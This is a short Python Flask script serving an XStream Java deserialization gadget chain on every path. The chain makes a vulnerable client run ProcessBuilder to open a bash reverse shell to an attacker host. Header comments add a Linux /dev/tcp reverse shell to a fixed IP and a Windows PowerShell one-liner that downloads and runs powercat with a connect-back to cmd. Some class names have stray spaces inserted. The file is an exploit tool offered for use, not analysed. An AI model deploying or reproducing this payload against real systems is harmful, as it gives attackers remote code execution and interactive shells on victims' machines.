# -*- coding: utf-8 -*-
# linux反弹shell bash -i >&amp; /dev/tcp/192.168.20.82/9999 0>&amp;1
# windows反弹shell
# <string>powershell</string>
# <string>IEX (New-O bject System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');</string>
# <string>powercat -c 192.168.123.1 -p 2333 -e cmd</string>

from flask import Flask, Response
app = Flask(__name__)
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods = ['GET', 'POST'])
def catch_all(path):
  XML = """<l inked-hash-set>
  <jdk.nashorn.internal.O bjects.NativeString>
    <value class="com.sun.X ML.internal.bind.v2.runtime.unmarshaller.B ase64Data">
      <dataHandler>
        <dataSource class="com.sun.X ML.internal.ws.encoding.X ML.X MLMessage$X MLDataSource">
          <is class="javax.crypto.CipherInputStream">
            <cipher class="javax.crypto.NullCipher">
              <serviceIterator class="javax.imageio.spi.FilterIterator">
                <iter class="javax.imageio.spi.FilterIterator">
                  <iter class="java.util.Collections$EmptyIterator"/>
                  <next class="java.lang.ProcessBuilder">
                    <command>
                                <string>/bin/bash</string>
                      <string>-c</string>
                      <string>bash -i >&amp; /dev/tcp/vps-ip/1234 0>&amp;1</string> 
                    </command>
                    <redirectErrorStream>false</redirectErrorStream>
                  </next>
                </iter>
                <filter class="javax.imageio.ImageIO$ContainsFilter">
                  <method>
                    <class>java.lang.ProcessBuilder</class>
                    <name>start</name>
                    <parameter-types/>
                  </method>
                  <name>foo</name>
                </filter>
                <next class="string">foo</next>
              </serviceIterator>
              <lock/>
            </cipher>
            <input class="java.lang.ProcessBuilder$NullInputStream"/>
            <ibuffer></ibuffer>
          </is>
        </dataSource>
      </dataHandler>
    </value>
  </jdk.nashorn.internal.O bjects.NativeString>
</l inked-hash-set>"""
  return Response(XML, mimetype='application/XML')
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=2222)